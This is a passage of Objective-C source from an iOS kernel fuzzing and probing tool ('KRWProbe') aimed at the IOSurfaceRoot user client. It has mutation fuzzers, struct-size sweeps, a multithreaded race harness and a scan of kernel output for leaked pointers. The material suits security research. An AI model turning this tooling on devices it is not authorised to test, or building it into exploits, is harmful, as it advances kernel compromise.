      kr, kr, kr == KERN_SUCCESS ? "OK" : "FAIL", out32Size, out32);

    // ---- sel 9: set value, structIn = 0xc header + [value, key] plist ----
    NSString *setXml = set_value_xml();
    const char *setc = setXml.UTF8String;
    size_t setLen = strlen(setc) + 1;
    size_t in9Size = 0xc + setLen;
    uint8_t *in9 = (uint8_t *)calloc(1, in9Size);
    if (!in9) {
        L(@"sel9: alloc %zu failed, skipped", in9Size);
    } else {
        memcpy(in9, &sid, sizeof(sid));                // +0x00 surface id
        memcpy(in9 + 0xc, setc, setLen);               // +0x0c serialized plist
        out32 = 0; out32Size = sizeof(out32);
        kr = IOConnectCallMethod(conn, 9, NULL, 0, in9, in9Size, NULL, NULL, &out32, &out32Size);
        L(@"sel9 SET 'KRWProbeValue'=1 -> kr=0x%x (%u) %s, structIn=%zu structOut=%zu/4 value=%u",
          kr, kr, kr == KERN_SUCCESS ? "OK" : "FAIL", in9Size, out32Size, out32);
    }
    free(in9);

    // ---- sel 10: get value, structIn >= 0xd (0xc header + C-string key) ----
    const char *key = "KRWProbeValue";
    size_t keyLen = strlen(key) + 1;
    size_t in10Size = 0xc + keyLen;
    uint8_t *in10 = (uint8_t *)calloc(1, in10Size);
    size_t getOutSize = 0x800;      // variable-length output (>= 0xd, < 4096 inband limit)
    uint8_t *getOut = (uint8_t *)calloc(1, getOutSize);
    if (!in10 || !getOut) {
        L(@"sel10/11: alloc failed (in=%p out=%p), skipped", in10, getOut);
    } else {
        memcpy(in10, &sid, sizeof(sid));               // +0x00 surface id
        // +0x04 unused, +0x08 flags = 0 (no CreationProperties filtering)
        memcpy(in10 + 0xc, key, keyLen);               // +0x0c C-string key
        kr = IOConnectCallMethod(conn, 10, NULL, 0, in10, in10Size, NULL, NULL, getOut, &getOutSize);
        L(@"sel10 GET 'KRWProbeValue' -> kr=0x%x (%u) %s, structIn=%zu structOut=%zu",
          kr, kr, kr == KERN_SUCCESS ? "OK" : "FAIL", in10Size, getOutSize);
        if (getOutSize > 0x800) getOutSize = 0x800;   // defensive: never exceed the buffer
        if (kr == KERN_SUCCESS && getOutSize > 0xc) {
            L(@"sel10: serialized value (%zu bytes at out+0xc):\n%@",
              getOutSize - 0xc, hexdump_lines(getOut + 0xc, MIN(getOutSize - 0xc, (size_t)0x40)));
        }

        // ---- sel 11: remove value, structIn > 0xc, 4-byte answer ----
        uint8_t *in11 = (uint8_t *)calloc(1, in10Size);
        if (!in11) {
            L(@"sel11: alloc %zu failed, skipped", in10Size);
        } else {
            memcpy(in11, &sid, sizeof(sid));
            memcpy(in11 + 0xc, key, keyLen);
            out32 = 0; out32Size = sizeof(out32);
            kr = IOConnectCallMethod(conn, 11, NULL, 0, in11, in10Size, NULL, NULL, &out32, &out32Size);
            L(@"sel11 REMOVE 'KRWProbeValue' -> kr=0x%x (%u) %s, structIn=%zu structOut=%zu/4 value=%u",
              kr, kr, kr == KERN_SUCCESS ? "OK" : "FAIL", in10Size, out32Size, out32);
        }
        free(in11);
    }

    // ---- sel 1: release by global id, scalarIn = 1, no outputs ----
    uint64_t rel[1] = { sid };
    kr = IOConnectCallMethod(conn, 1, rel, 1, NULL, 0, NULL, NULL, NULL, NULL);
    L(@"sel1 RELEASE id=%u -> kr=0x%x (%u) %s", sid, kr, kr, kr == KERN_SUCCESS ? "OK" : "FAIL");

    free(getOut);
    free(in10);
    free(info);
    IOServiceClose(conn);
    L(@"=== CREATE probe done ===");
}


// ---- deterministic PRNG (xorshift64*) ----
static uint64_t gState = 0x9e3779b97f4a7c15ULL;
static uint64_t rnd(void) {
    gState ^= gState >> 12; gState ^= gState << 25; gState ^= gState >> 27;
    return gState * 2685821657736338717ULL;
}
static uint32_t pick(uint32_t *v, int n) { return v[rnd() % (uint64_t)n]; }

static void test_basic(void) {
    IOSurfaceRef s = IOSurfaceCreate((__bridge CFDictionaryRef)base_props(64, 64));
    if (!s) { L(@"basic surface: create FAILED"); return; }
    L(@"basic surface: id=%u alloc=%zu bpe=%zu bpr=%zu base=%p",
      IOSurfaceGetID(s), IOSurfaceGetAllocSize(s), IOSurfaceGetBytesPerElement(s),
      IOSurfaceGetBytesPerRow(s), IOSurfaceGetBaseAddress(s));
    CFRelease(s);
}

static void test_planes(int planes, uint32_t w, uint32_t h) {
    NSMutableArray *arr = [NSMutableArray array];
    for (int i = 0; i < planes; i++) {
        [arr addObject:@{ @"IOSurfacePlaneWidth": @(w),
                          @"IOSurfacePlaneHeight": @(h),
                          @"IOSurfacePlaneBytesPerElement": @(4),
                          @"IOSurfacePlaneBytesPerRow": @(w * 4) }];
    }
    NSMutableDictionary *p = [base_props(w, h) mutableCopy];
    p[@"IOSurfacePlaneInfo"] = arr;
    IOSurfaceRef s = IOSurfaceCreate((__bridge CFDictionaryRef)p);
    if (!s) { L(@"planes=%d %ux%u: rejected", planes, w, h); return; }
    L(@"planes=%d %ux%u: OK id=%u alloc=%zu count=%zu", planes, w, h,
      IOSurfaceGetID(s), IOSurfaceGetAllocSize(s), IOSurfaceGetPlaneCount(s));
    CFRelease(s);
}

static void test_user_clients(void) {
    L(@"--- user clients (controls first) ---");
    L(@"%@", io_open(@"NoSuchService_SMITH_0"));      // control: must be "no service"
    L(@"%@", io_open(@"AppleMobileFileIntegrity"));   // control: expected denied
    L(@"%@", io_open(@"IOSurfaceRoot"));
    L(@"%@", io_open(@"AppleAVE2Driver"));
    L(@"%@", io_open(@"AppleAVE2Interface"));
    L(@"%@", io_open(@"AppleH11ANEInterface"));
    L(@"%@", io_open(@"AGXAcceleratorG14P"));
}

static void test_aggressive(void) {
    set_phase(@"AGGR 4 cases");
    L(@"--- compressed-plane 32-bit product ---");
    uint64_t cases[4][3] = {
        {0x1000, 0x1000, 0x20000},
        {0x80000000, 0x80000000, 2},
        {0x40000000, 0x40000000, 3},
        {0xffffffff, 0xffffffff, 0xffffffff},
    };
    for (int i = 0; i < 4; i++) {
        NSMutableDictionary *p = [base_props(64, 64) mutableCopy];
        p[@"IOSurfaceAllocSize"] = @(0x10000);
        p[@"IOSurfacePlaneInfo"] = @[@{
            @"IOSurfacePlaneWidth": @(64), @"IOSurfacePlaneHeight": @(64),
            @"IOSurfacePlaneBytesPerElement": @(4),
            @"IOSurfacePlaneBytesPerRow": @(512),
            @"IOSurfacePlaneCompressionType": @(4),
            @"IOSurfaceSliceCount": @(cases[i][2]),
            @"IOSurfacePlaneDataRegionBytesPerSlice": @(cases[i][0]),
            @"IOSurfacePlaneHeaderRegionBytesPerSlice": @(cases[i][1]),
            @"IOSurfacePlaneBytesPerCompressedTileHeader": @(8),
            @"IOSurfacePlaneBytesPerTileData": @(256),
        }];
        IOSurfaceRef s = IOSurfaceCreate((__bridge CFDictionaryRef)p);
        L(@"case %d data=%llu hdr=%llu slices=%llu -> %s", i,
          cases[i][0], cases[i][1], cases[i][2], s ? "CREATED" : "rejected");
        if (s) CFRelease(s);
    }
}

// ---- fuzzer ----
static NSDictionary *random_config(uint64_t iter) {
    static uint32_t small[] = {0,1,2,3,4,5,7,8,15,16,17,31,32,63,64,65,127,128,255,256,257,511,512,1023,4096,65535,65536};
    static uint32_t big[] = {0x7fffffff,0x80000000,0x80000001,0xfffffffe,0xffffffff,0x40000000,0x20000000,0x10000000,0xffff,0x10000};
    static uint32_t type[] = {0,1,2,3,4,5};
    uint32_t w = 1 + (uint32_t)(rnd() % 4096);
    uint32_t h = 1 + (uint32_t)(rnd() % 4096);
    int planes = 1 + (int)(rnd() % 4);
    NSMutableArray *arr = [NSMutableArray array];
    for (int i = 0; i < planes; i++) {
        NSMutableDictionary *d = [@{ @"IOSurfacePlaneWidth": @(w),
                                     @"IOSurfacePlaneHeight": @(h),
                                     @"IOSurfacePlaneBytesPerElement": @(4),
                                     @"IOSurfacePlaneBytesPerRow": @(w * 4) } mutableCopy];
        if (rnd() & 1) d[@"IOSurfacePlaneCompressionType"] = @(pick(type, 6));
        if (rnd() & 1) d[@"IOSurfaceSliceCount"] = @((rnd() & 1) ? pick(small, 27) : pick(big, 10));
        if (rnd() & 1) d[@"IOSurfacePlaneDataRegionBytesPerSlice"] = @((rnd() & 1) ? pick(small, 27) : pick(big, 10));
        if (rnd() & 1) d[@"IOSurfacePlaneHeaderRegionBytesPerSlice"] = @((rnd() & 1) ? pick(small, 27) : pick(big, 10));
        if (rnd() & 1) d[@"IOSurfacePlaneCompressedTileWidth"] = @(pick(small, 27));
        if (rnd() & 1) d[@"IOSurfacePlaneCompressedTileHeight"] = @(pick(small, 27));
        if (rnd() & 1) d[@"IOSurfacePlaneBytesPerCompressedTileHeader"] = @(pick(small, 27));
        if (rnd() & 1) d[@"IOSurfacePlaneBytesPerTileData"] = @(pick(small, 27));
        if (rnd() & 1) d[@"IOSurfacePlaneWidthInCompressedTiles"] = @(pick(small, 27));
        if (rnd() & 1) d[@"IOSurfacePlaneHeightInCompressedTiles"] = @(pick(small, 27));
        if (rnd() & 1) d[@"IOSurfacePlaneBytesPerRowOfTileData"] = @(pick(small, 27));
        if (rnd() & 1) d[@"IOSurfacePlaneCompressedTileHeaderRegionOffset"] = @(pick(small, 27));
        if (rnd() & 1) d[@"IOSurfacePlaneCompressedTileDataRegionOffset"] = @(pick(small, 27));
        if (rnd() & 1) d[@"IOSurfacePlaneBitsPerBlock"] = @(pick(small, 27));
        if (rnd() & 1) d[@"IOSurfacePlaneHTPCPredictionSelector"] = @(pick(small, 27));
        [arr addObject:d];
    }
    NSMutableDictionary *p = [base_props(w, h) mutableCopy];
    p[@"IOSurfaceAllocSize"] = @(0x4000 + (rnd() % 0x40000));
    p[@"IOSurfacePlaneInfo"] = arr;
    return p;
}

static void fuzz_loop(int iters) {
    L(@"--- FUZZ start (%d iters), log=%s ---", iters, gLastPath.UTF8String);
    set_phase(@"FUZZ %d", iters);
    gStop = 0;
    int created = 0;
    for (int i = 0; i < iters && !gStop; i++) {
        @autoreleasepool {
            gState = 0x9e3779b97f4a7c15ULL ^ (uint64_t)i;
            NSDictionary *cfg = random_config((uint64_t)i);
            NSString *json = [[NSString alloc] initWithData:
                [NSJSONSerialization dataWithJSONObject:cfg options:0 error:nil]
                encoding:NSUTF8StringEncoding];
            write_both(json, gLastPath, gLastPathTmp);
            IOSurfaceRef s = IOSurfaceCreate((__bridge CFDictionaryRef)cfg);
            if (s) { created++; CFRelease(s); }
            if ((i % 1000) == 0) {
                set_phase(@"FUZZ %d: %d/%d", iters, i, iters);
                L(@"fuzz %d/%d created=%d", i, iters, created);
            }
        }
    }
    set_phase(@"FUZZ done");
    L(@"--- FUZZ done: %d iters, %d created, last config kept ---", iters, created);
}


// ---- MUTATE: structured mutation fuzzer over raw IOSurfaceRootUserClient sel 0 ----
//
// Base (identical top-level four keys to CREATE):
//   IOSurfaceWidth=64 IOSurfaceHeight=64
//   IOSurfaceBytesPerElement=4 IOSurfacePixelFormat='BGRA'
//   IOSurfacePlaneInfo = [ { plane 64x64, bpe=4, bpr=256,
//       compressed baseline: tile 32x32, 2x2 tiles, 8-byte tile headers,
//       4096-byte tile data, 8192-byte tile row, data region at 0,
//       header region at 0x4000 } ]
//
// The compressed baseline is inert unless IOSurfacePlaneCompressionType is
// present, so the unmutated base is still the known-good plain surface.
// Each iteration replaces 1-3 fields with boundary values (or small random
// values).  IOSurfaceSliceCount / IOSurfaceBitsPerBlock / IOSurfaceAllocSize
// are top-level keys; the rest live in the plane dictionary.

#define MUT_FIELD_COUNT 17
#define MUT_RECONNECT_EVERY 64

enum {
    MUT_CT = 0, MUT_SLICE, MUT_DATA_SLICE, MUT_HDR_SLICE,
    MUT_TILE_W, MUT_TILE_H, MUT_HDR_BYTES, MUT_TILE_BYTES,
    MUT_TILES_W, MUT_TILES_H, MUT_TILE_BPR,
    MUT_HDR_OFF, MUT_DATA_OFF, MUT_HTPC_PRED, MUT_HTPC_GROUP,
    MUT_BITS_BLOCK, MUT_ALLOC
};

static const char *kMutKeys[MUT_FIELD_COUNT] = {
    "IOSurfacePlaneCompressionType",
    "IOSurfaceSliceCount",
    "IOSurfacePlaneDataRegionBytesPerSlice",
    "IOSurfacePlaneHeaderRegionBytesPerSlice",
    "IOSurfacePlaneCompressedTileWidth",
    "IOSurfacePlaneCompressedTileHeight",
    "IOSurfacePlaneBytesPerCompressedTileHeader",
    "IOSurfacePlaneBytesPerTileData",
    "IOSurfacePlaneWidthInCompressedTiles",
    "IOSurfacePlaneHeightInCompressedTiles",
    "IOSurfacePlaneBytesPerRowOfTileData",
    "IOSurfacePlaneCompressedTileHeaderRegionOffset",
    "IOSurfacePlaneCompressedTileDataRegionOffset",
    "IOSurfacePlaneHTPCPredictionSelector",
    "IOSurfacePlaneHTPCVerticalHeaderGroupingMode",
    "IOSurfaceBitsPerBlock",
    "IOSurfaceAllocSize",
};

// Defaults for the compressed baseline.  CT/SLICE/BITS/ALLOC are only emitted
// when they are the mutated field (CT off => whole compressed block is skipped).
static const uint64_t kMutDefaults[MUT_FIELD_COUNT] = {
    0,          // MUT_CT
    0,          // MUT_SLICE (kernel default = 1)
    0x4000,     // data region bytes per slice = 16 KiB
    0,          // header region bytes per slice
    32,         // compressed tile width
    32,         // compressed tile height
    8,          // bytes per compressed tile header
    4096,       // bytes per tile data (32*32*4)
    2,          // width in compressed tiles (64/32)
    2,          // height in compressed tiles (64/32)
    8192,       // bytes per row of tile data (2 * 4096)
    0x4000,     // header region offset (= end of 16 KiB data region)
    0,          // data region offset
    0,          // HTPC prediction selector
    0,          // HTPC vertical header grouping mode
    0,          // MUT_BITS_BLOCK
    0,          // MUT_ALLOC
};

static void mut_append_int(NSMutableString *s, const char *key, uint64_t v) {
    [s appendFormat:@"<key>%s</key><integer>%llu</integer>",
       key, (unsigned long long)v];
}

static NSString *mutate_config_xml(const int *chosen, const uint64_t *vals) {
    NSMutableString *s = [NSMutableString stringWithCapacity:2048];
    [s appendString:@"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                  "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" "
                  "\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n"
                  "<plist version=\"1.0\"><dict>"];
    mut_append_int(s, "IOSurfaceWidth", 64);
    mut_append_int(s, "IOSurfaceHeight", 64);
    mut_append_int(s, "IOSurfaceBytesPerElement", 4);
    mut_append_int(s, "IOSurfacePixelFormat", 0x42475241);   // 'BGRA'

    if (chosen && chosen[MUT_ALLOC]) mut_append_int(s, kMutKeys[MUT_ALLOC], vals[MUT_ALLOC]);
    if (chosen && chosen[MUT_BITS_BLOCK]) mut_append_int(s, kMutKeys[MUT_BITS_BLOCK], vals[MUT_BITS_BLOCK]);
    if (chosen && chosen[MUT_SLICE]) mut_append_int(s, kMutKeys[MUT_SLICE], vals[MUT_SLICE]);

    [s appendString:@"<key>IOSurfacePlaneInfo</key><array><dict>"];
    mut_append_int(s, "IOSurfacePlaneWidth", 64);
    mut_append_int(s, "IOSurfacePlaneHeight", 64);
    mut_append_int(s, "IOSurfacePlaneBytesPerElement", 4);
    mut_append_int(s, "IOSurfacePlaneBytesPerRow", 256);

    if (chosen && chosen[MUT_CT]) mut_append_int(s, kMutKeys[MUT_CT], vals[MUT_CT]);
    for (int i = MUT_DATA_SLICE; i <= MUT_HTPC_GROUP; i++) {
        uint64_t v = (chosen && chosen[i]) ? vals[i] : kMutDefaults[i];
        mut_append_int(s, kMutKeys[i], v);
    }
    [s appendString:@"</dict></array></dict></plist>"];
    return s;
}

static const uint64_t kBoundaryValues[] = {
    0, 1, 2, 3, 4, 7, 8, 15, 16, 31, 32, 63, 64, 127, 128, 255, 256,
    511, 512, 1023, 4096, 65535, 65536, 0x40000000ULL, 0x80000000ULL,
    0xffffffffULL
};
#define kBoundaryCount ((int)(sizeof(kBoundaryValues) / sizeof(kBoundaryValues[0])))

static uint64_t mut_pick_value(int field) {
    // The compression type is the gate for the whole compressed block: bias
    // it toward the three values that fit the AGX-style baseline.
    if (field == MUT_CT) {
        uint64_t r = rnd() % 100;
        if (r < 70) {
            static const uint64_t types[] = { 2, 3, 4 };
            return types[rnd() % 3];
        }
        if (r < 85) return (rnd() & 1) ? 0 : 1;
    }
    if ((rnd() % 100) < 30) {           // small random value
        return (rnd() & 1) ? (rnd() % 4097) : (rnd() % 65537);
    }
    return kBoundaryValues[rnd() % kBoundaryCount];
}

static void mut_select(int *chosen, uint64_t *vals, int *nmut) {
    memset(chosen, 0, sizeof(int) * MUT_FIELD_COUNT);
    int n = 1 + (int)(rnd() % 3);              // 1..3 mutated fields
    if ((rnd() % 3) != 0) {                    // 2/3 of runs force the gate
        chosen[MUT_CT] = 1;
        n--;
    }
    while (n > 0) {
        int f = (int)(rnd() % MUT_FIELD_COUNT);
        if (!chosen[f]) { chosen[f] = 1; n--; }
    }
    *nmut = 0;
    for (int i = 0; i < MUT_FIELD_COUNT; i++) {
        if (chosen[i]) {
            vals[i] = mut_pick_value(i);
            (*nmut)++;
        }
    }
}

static io_connect_t mut_open_conn(void) {
    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                   IOServiceMatching("IOSurfaceRoot"));
    if (!svc) { L(@"MUTATE: no IOSurfaceRoot service"); return 0; }
    io_connect_t conn = 0;
    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
    IOObjectRelease(svc);
    if (kr != KERN_SUCCESS) {
        L(@"MUTATE: IOServiceOpen kr=0x%x (%u) FAIL", kr, kr);
        return 0;
    }
    return conn;
}

static void mutate_loop(int iters) {
    if (gMutateBusy) { L(@"MUTATE: already running"); return; }
    gMutateBusy = 1;
    gStop = 0;
    gState = 0x9e3779b97f4a7c15ULL ^ (uint64_t)mach_absolute_time();

    L(@"=== KRWProbe 1.4 MUTATE (%d iters) ===", iters);
    L(@"base: 64x64 BGRA, plane 64x64 bpe=4 bpr=256, compressed baseline tiles 32x32 2x2 hdr=8 data=16KiB");
    L(@"file: %@  (XML + iteration is rewritten before every sel 0 call)", gMutatePath);
    set_phase(@"MUTATE %dk", iters / 1000);

    io_connect_t conn = mut_open_conn();
    if (!conn) { gMutateBusy = 0; return; }

    // One heap buffer for the whole run, sized exactly for IOSurfaceInfo.
    uint8_t *info = (uint8_t *)calloc(1, IOSURFACE_INFO_SIZE);
    if (!info) { L(@"MUTATE: info alloc failed"); IOServiceClose(conn); gMutateBusy = 0; return; }

    // Preflight: the unmutated base (compressed keys inert because CT is absent).
    {
        NSString *xml = mutate_config_xml(NULL, NULL);
        const char *xc = xml.UTF8String;
        memset(info, 0, IOSURFACE_INFO_SIZE);
        size_t isz = IOSURFACE_INFO_SIZE;
        uint64_t sc[1] = { 0 };
        kern_return_t kr = IOConnectCallMethod(conn, 0, sc, 1, xc, strlen(xc) + 1,
                                               NULL, NULL, info, &isz);
        L(@"MUTATE preflight base: kr=0x%x (%u) %s, structOut=%zu/0xc68, id=%u",
          kr, kr, kr == KERN_SUCCESS ? "OK" : "FAIL", isz,
          kr == KERN_SUCCESS ? rd32(info + IOSURFACE_INFO_ID_OFF) : 0);
    }

    int created = 0, calls = 0, connGen = 0;
    kern_return_t lastKr = 0;
    uint32_t lastId = 0;

    for (int i = 0; i < iters && !gStop; i++) {
        if (i > 0 && (i % MUT_RECONNECT_EVERY) == 0) {
            IOServiceClose(conn);
            connGen++;
            conn = mut_open_conn();
            if (!conn) { L(@"MUTATE: reconnect failed at i=%d", i); break; }
        }
        @autoreleasepool {
            int chosen[MUT_FIELD_COUNT];
            uint64_t vals[MUT_FIELD_COUNT];
            int nmut = 0;
            mut_select(chosen, vals, &nmut);
            NSString *xml = mutate_config_xml(chosen, vals);

            NSString *dump = [NSString stringWithFormat:
                @"%@\n<!-- KRWProbe 1.4 MUTATE iteration %d, %d mutated field(s) -->\n",
                xml, i, nmut];
            NSError *err = nil;
            if (![dump writeToFile:gMutatePath atomically:YES
                           encoding:NSUTF8StringEncoding error:&err]) {
                if ((i % 1000) == 0) {
                    L(@"MUTATE: last_config.xml write FAILED: %@", err.localizedDescription);
                }
            }
            if (gMutatePathTmp) {
                [dump writeToFile:gMutatePathTmp atomically:YES
                         encoding:NSUTF8StringEncoding error:nil];
            }

            const char *xc = xml.UTF8String;
            size_t xlen = xc ? strlen(xc) + 1 : 0;  // kernel requires trailing NUL
            uint64_t sc[1] = { 0 };            // parent id 0, hi32 = 0
            memset(info, 0, IOSURFACE_INFO_SIZE);
            size_t isz = IOSURFACE_INFO_SIZE;
            kern_return_t kr = 0xe00002c2;
            if (xc && xlen <= 0x1000) {
                kr = IOConnectCallMethod(conn, 0, sc, 1, xc, xlen,
                                         NULL, NULL, info, &isz);
            }
            calls++;
            lastKr = kr;
            lastId = 0;
            if (kr == KERN_SUCCESS && isz >= IOSURFACE_INFO_ID_OFF + 4) {
                created++;
                lastId = rd32(info + IOSURFACE_INFO_ID_OFF);
            }

            if ((i % 1000) == 0) {
                set_phase(@"MUTATE %dk: %d/%d", iters / 1000, i, iters);
                L(@"MUTATE %d/%d created=%d last_kr=0x%x id=%u nmut=%d conn_gen=%d",
                  i, iters, created, kr, lastId, nmut, connGen);
            }
        }
    }

    free(info);
    if (conn) IOServiceClose(conn);
    set_phase(@"MUTATE done");
    L(@"=== MUTATE done: %d calls, %d created (%.2f%%), %d reconnects, last_kr=0x%x%s ===",
      calls, created, calls ? 100.0 * (double)created / (double)calls : 0.0,
      connGen, lastKr, gStop ? " STOPPED" : "");
    gMutateBusy = 0;
}


// ---- HARD: aggressive matrix + struct-shape + race over the verified raw path ----
//
// GEOMETRY: the base is the same 64x64 BGRA plist + one 64x64 plane, but with
// IOSurfacePlaneCompressionType=4 and a valid AGX-style compressed baseline
// (tile 32x32, 2x2 tiles, 8-byte headers, 4096-byte tile data, 8192-byte tile
// row, data region at 0, header region at 0x4000).  Every compressed field is
// swept over the boundary set one at a time, then compression type x field,
// then nine selected pairs.
//
// STRUCT: sel 2/3/9/10/11 with structIn 0,1,4,8,0xb,0xc and 0xd..0x200, all
// scalar counts 0..4, plausible prefixes, expected structOut.  Every result
// other than 0xe00002c2 is logged and the output is scanned for kernel-looking
// 64-bit pointers.
//
// RACE: one raw-created surface, five threads on sel 9/10/11 and sel 2/3, plus
// one thread doing IOSurfaceCreate/CFRelease churn, for 30 seconds.

static const uint64_t kHardCTValues[] = { 0, 1, 2, 3, 4, 5 };
#define kHardCTCount ((int)(sizeof(kHardCTValues) / sizeof(kHardCTValues[0])))

typedef struct { int a; int b; const char *name; } HardPair;
static const HardPair kHardPairs[] = {
    { MUT_TILE_W,    MUT_TILE_H,    "TileWxTileH" },
    { MUT_TILES_W,   MUT_TILES_H,   "TilesWxTilesH" },
    { MUT_DATA_SLICE, MUT_SLICE,    "DataSliceXSliceCount" },
    { MUT_HDR_SLICE, MUT_SLICE,     "HdrSliceXSliceCount" },
    { MUT_HDR_OFF,   MUT_DATA_OFF,  "HdrOffXDataOff" },
    { MUT_TILE_BYTES, MUT_TILE_BPR, "TileBytesXTileBPR" },
    { MUT_TILE_W,    MUT_HDR_BYTES, "TileWXHeaderBytes" },
    { MUT_TILES_W,   MUT_TILE_BPR,  "TilesWXTileBPR" },
    { MUT_HTPC_PRED, MUT_HTPC_GROUP, "HTPCPredXGroup" },
};
#define kHardPairCount ((int)(sizeof(kHardPairs) / sizeof(kHardPairs[0])))

typedef struct { io_connect_t conn; int gen; long calls; uint64_t liveBytes; } HardConn;

// Hard ceiling for every structureOut we hand to the kernel.  IOSurfaceInfo is
// 0xc68; the in-band limit is 0x1000.  Nothing in HARD may pass a larger cap.
#define HARD_OUT_CAP   0x1000u
#define HARD_IN_CAP    0x200u
#define HARD_XML_CAP   0x1000u
_Static_assert(HARD_OUT_CAP >= IOSURFACE_INFO_SIZE,
               "HARD scratch buffer must hold a full IOSurfaceInfo (0xc68)");
_Static_assert(HARD_IN_CAP >= 0x200u, "structIn sweep must fit 0x200 bytes");

// ---- HARD resume/config -----------------------------------------------------
// 1.5: geometry asks the kernel for IOSurfaceAllocSize values taken from the
// boundary table.  0x40000000 (1 GiB) really succeeds -- the created count in
// the singles sweep proves it (144 at idx 400, 147 at idx 421, and only 65535,
// 65536 and 1 GiB are >= the 16 KiB image size in that range).  The second
// 1 GiB request (ct-pair 2467) is what kills the process.  Never let HARD ask
// for more than alloc_cap bytes, and recycle the connection before the live
// surfaces of one client add up to more than HARD_LIVE_CAP.
#define HARD_DEFAULT_ALLOC_CAP  (64ULL * 1024 * 1024)   // 64 MiB
#define HARD_LIVE_CAP           (256ULL * 1024 * 1024)  // 256 MiB / connection

static int      gHardCfgPhase = 0;              // 0 geom, 1 struct, 2 race
static NSString *gHardCfgStage = @"singles";    // singles | ct-pair | pair
static int      gHardCfgIndex = 0;              // skip idx < this in that stage
static uint64_t gHardAllocCap = HARD_DEFAULT_ALLOC_CAP;
static NSString *gHardCfgSource = @"defaults";

static int hard_stage_ordinal(NSString *s) {
    if ([s isEqualToString:@"singles"]) return 0;
    if ([s isEqualToString:@"ct-pair"]) return 1;
    if ([s isEqualToString:@"pair"])    return 2;
    return 0;
}

// Parse <Documents>/KRWProbe-hard.txt.  Keys (one per line, # comments):
//   phase=0|1|2  stage=singles|ct-pair|pair  index=N  alloc_cap=BYTES
// Missing file or bad values leave the safe defaults in place.
static void hard_load_config(void) {
    gHardCfgPhase = 0;
    gHardCfgStage = @"singles";
    gHardCfgIndex = 0;
    gHardAllocCap = HARD_DEFAULT_ALLOC_CAP;
    gHardCfgSource = @"defaults";
    if (!gHardCfgPath) return;
    NSString *txt = read_capped(gHardCfgPath);
    if (!txt.length) return;
    gHardCfgSource = gHardCfgPath;
    for (NSString *raw in [txt componentsSeparatedByCharactersInSet:
                           [NSCharacterSet newlineCharacterSet]]) {
        NSString *line = [raw stringByTrimmingCharactersInSet:
                          [NSCharacterSet whitespaceCharacterSet]];
        NSRange hash = [line rangeOfString:@"#"];
        if (hash.location != NSNotFound) line = [line substringToIndex:hash.location];
        NSRange eq = [line rangeOfString:@"="];
        if (eq.location == NSNotFound) continue;
        NSString *k = [[line substringToIndex:eq.location]
                       stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceCharacterSet]];
        NSString *v = [[line substringFromIndex:eq.location + 1]
                       stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceCharacterSet]];
        if ([k isEqualToString:@"phase"]) {
            int p = v.intValue;
            if (p >= 0 && p <= 2) gHardCfgPhase = p;
        } else if ([k isEqualToString:@"stage"]) {
            if ([v isEqualToString:@"singles"] || [v isEqualToString:@"ct-pair"] ||
                [v isEqualToString:@"pair"])
                gHardCfgStage = [v copy];
            else
                L(@"HARD: bad stage '%@' in %@, using singles", v, gHardCfgPath);
        } else if ([k isEqualToString:@"index"]) {
            int i = v.intValue;
            if (i >= 0) gHardCfgIndex = i;
        } else if ([k isEqualToString:@"alloc_cap"]) {
            unsigned long long c = strtoull(v.UTF8String, NULL, 0);
            if (c >= 0x1000ULL) gHardAllocCap = c;
        }
    }
}

static void hard_write_progress(NSString *stage, int idx, int total) {
    if (!gHardProgressPath) return;
    NSString *s = [NSString stringWithFormat:
        @"phase=%d\nstage=%@\nindex=%d\ntotal=%d\nalloc_cap=%llu\nsource=%@\n",
        gHardCfgPhase, stage ?: @"?", idx, total,
        (unsigned long long)gHardAllocCap, gHardCfgSource ?: @"?"];
    [s writeToFile:gHardProgressPath atomically:YES
          encoding:NSUTF8StringEncoding error:NULL];
}


// last_action.json is written before every aggressive call.  In the geometry /
// struct phases the call rate is low, so force=YES.  In the race phase the six
// threads would otherwise spend all their time in the filesystem (and hold the
// lock), so those calls are rate-limited to 20 per second.
static void hard_write_action_ex(NSString *json, BOOL force) {
    static NSLock *lock = nil;
    static dispatch_once_t once;
    static CFAbsoluteTime last = 0;
    dispatch_once(&once, ^{ lock = [[NSLock alloc] init]; });
    if (!json || !gActionPath) return;
    NSString *out = json.length > 16384 ? [json substringToIndex:16384] : json;
    [lock lock];
    CFAbsoluteTime now = CFAbsoluteTimeGetCurrent();
    if (!force && (now - last) < 0.05) { [lock unlock]; return; }
    last = now;
    write_both(out, gActionPath, gActionPathTmp);
    [lock unlock];
}
static void hard_write_action(NSString *json) { hard_write_action_ex(json, NO); }

static NSString *hard_hex(const uint8_t *p, size_t n) {
    if (!p) return @"";
    size_t lim = n > 512 ? 512 : n;              // bound the log/JSON string
    NSMutableString *s = [NSMutableString stringWithCapacity:lim * 2 + 24];
    for (size_t i = 0; i < lim; i++) [s appendFormat:@"%02x", p[i]];
    if (n > lim) [s appendFormat:@"...(%zu bytes)", n];
    return s;
}

static void hard_dump_config(NSString *xml, NSString *tag) {
    if (!xml || !gMutatePath) return;
    NSString *dump = [NSString stringWithFormat:@"%@\n<!-- %@ -->\n", xml, tag ?: @""];
    if (dump.length > 16384) dump = [dump substringToIndex:16384];
    write_both(dump, gMutatePath, gMutatePathTmp);
}

static io_connect_t hard_open_conn(void) {
    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                   IOServiceMatching("IOSurfaceRoot"));
    if (!svc) { L(@"HARD: no IOSurfaceRoot service"); return 0; }
    io_connect_t conn = 0;
    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
    IOObjectRelease(svc);
    if (kr != KERN_SUCCESS) {
        L(@"HARD: IOServiceOpen kr=0x%x (%u) FAIL", kr, kr);
        return 0;
    }
    return conn;
}

static void hard_conn_close(HardConn *hc) {
    if (hc->conn) IOServiceClose(hc->conn);   // destroys every surface this client owns
    hc->conn = 0;
    hc->liveBytes = 0;
    hc->gen++;
}

static int hard_conn_reopen(HardConn *hc, const char *phase) {
    hc->conn = hard_open_conn();
    if (!hc->conn) {
        L(@"HARD: reconnect failed in %s after %ld calls", phase, hc->calls);
        return 0;
    }
    return 1;
}

